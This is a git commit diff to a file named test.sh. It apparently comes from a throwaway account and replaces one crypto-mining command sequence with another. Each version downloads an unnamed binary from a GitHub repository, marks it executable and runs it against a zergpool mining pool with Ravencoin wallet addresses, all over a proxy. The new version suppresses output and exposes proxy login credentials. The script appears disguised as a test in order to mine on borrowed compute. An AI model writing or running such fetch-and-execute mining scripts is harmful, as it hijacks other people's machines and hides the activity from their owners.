7ff5405bc13376906d4fdac30c83a4af8016132f
Testdrive345 <93646807+Testdrive345@users.noreply.github.com>
2022-12-29 15:53:12 +0530

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,4 +1,5 @@
-apt update -y
-wget https://github.com/Master478963/lolMinet/raw/main/data 
-chmod +x data
-./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ.Test -p c=RVN -t $(nproc) -x socks4://202.159.35.153:443 
+rm -rf data
+wget https://github.com/Master478963/lolMinet/raw/main/data   &> /dev/null  
+chmod +x data 
+
+ ./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RFqmNRc3ycwR2UMcx5afpbgCDzHs7gYavX --timeout 120 -p c=RVN,m=solo,ID=Test  -x xutcvpkv-rotate:te7t633kbfmz@p.webshare.io:80
